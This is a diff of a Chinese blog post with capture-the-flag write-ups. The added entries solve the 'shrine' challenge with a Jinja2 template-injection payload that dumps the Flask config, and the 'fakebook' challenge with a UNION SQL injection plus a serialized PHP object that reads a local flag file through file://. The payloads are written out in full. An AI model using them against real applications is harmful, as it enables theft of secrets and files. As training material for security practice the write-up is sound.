@@ -17,8 +17,11 @@
 <meta property="og:description" content="0X01: FlatScience">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/4.png">
 <meta property="article:published_time" content="2020-03-11T10:22:54.000Z">
-<meta property="article:modified_time" content="2020-03-12T01:27:59.348Z">
+<meta property="article:modified_time" content="2020-03-13T14:00:56.907Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="train">
 <meta name="twitter:card" content="summary">
@@ -213,7 +216,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>0X01: FlatScience<a id="more"></a></p>
+        <p>0X01: FlatScience<a id="more"></a>20-3-11</p>
 <p>拿到网页，正常操作scan扫一发</p>
 <img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png" class="" title="examplename">
 
@@ -239,6 +242,51 @@
 
 <p>跑出的密码为ThinJerboa，在admin.php页面登录就可以拿到flag</p>
 <p>（还有一种方法是这段密码刚好可以进行md5解密，去掉题目给出的那部分刚好是ThinJerboa）</p>
+<p>0X02:shrine20-3-12</p>
+<p>打开网页，整理一下给出的python代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>审一下，发现’()’会被替换为空，在blacklist中的会被置为None，提交的参数在/shrine/的路径下</p>
+<p>下面来进行一下测试</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/2.png" class="" title="examplename">
+
+<p>通过查阅SSTI模板引擎注入图可以知道应该是jinja2+flask</p>
+<p>由于这里的变量config被禁用，暂时没想到什么办法，看了其他师傅的wp，知道了要用python的沙箱逃逸方法，查了有关flask的内置函数，以下是资料</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url_for() : url_for会根据传入的路由器函数名，返回该路由的URL，在模板中始终使用url_for（）就可以安全的修改路由绑定的URL，则不必担心模板中渲染错的连接，&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ，如果我们定义的路由URL是带有参数的，则可以把他们作为关键字参数传入url_for（），Flask会把他们填充进最终生成的URL中，&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span class="line">get_flashed_messages():这个函数会返回之前在flask中通过flask（）传入的消息的列表，flash函数的作用很简单，可以把由Python字符串表示的信息加入一个消息队列中，在使get_flashed_message()函数取出他们并消费掉</span><br></pre></td></tr></table></figure>
+
+<p>下面用get_flashed_messages()的方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/3.png" class="" title="examplename">
+
+<p>可以找到current_app,继续注入当前app的config</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_fiashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以找到flag，这里就不贴了</p>
+<p>0X03:fakebook</p>
+<p>拿到题目，scan冲一发</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/4.png" class="" title="examplename">
+
+<p>发现有robots.txt，访问，下载源码user.php.bak</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>审阅源码发现get()可能存在ssrf服务端楼的那个，join一个账号,点username页面跳转，发现一个注入点</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:44796/view.php?no=1</span><br></pre></td></tr></table></figure>
+
+<p>下面开始注入测试：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">no=1 order by 5<span class="comment">#//报错，说明没有五个字段，并且爆出了路径在 /var/www/html/db.php下</span></span><br><span class="line">no=1 order by 5<span class="comment">#//正常回显，说明是4个字段，下面开始爆库</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有一个注意的地方就是,经过多次测试发现union 和select不能同时使用，用注释/**/进行绕过</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">no = -1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#//爆出fakebook库</span></span><br><span class="line"><span class="keyword">no</span>= <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'fakebook'</span><span class="comment">#//爆出users表</span></span><br><span class="line"><span class="keyword">no</span> = <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">#爆出no,username,passwd,data字段</span></span><br><span class="line">下面可以一个个查询信息，可以看到<span class="keyword">data</span>中的数据进行了序列化</span><br><span class="line">O:8:"UserInfo":3&#123;s:4:"name";s:7:"hjfashd";s:3:"age";i:1123;s:4:"blog";s:13:"www.baidu.com";&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在目录扫描中可以看到存在flag.php，可以把blog改为/var/www/html/flag.php路径就可以拿到flag了,这里还要注意用file：//协议来读取,此外data在第四个字段，所以这里查询时也要放在第四位</p>
+<p>到这里，我们就可以根据已知的信息来构造payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:no=-1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:3:"ggg";s:3:"age";i:12356;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>查看网页源码，可以看到</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg=='&gt;</span><br></pre></td></tr></table></figure>
+
+<p>base64解码就可以了</p>
 
       
     </div>
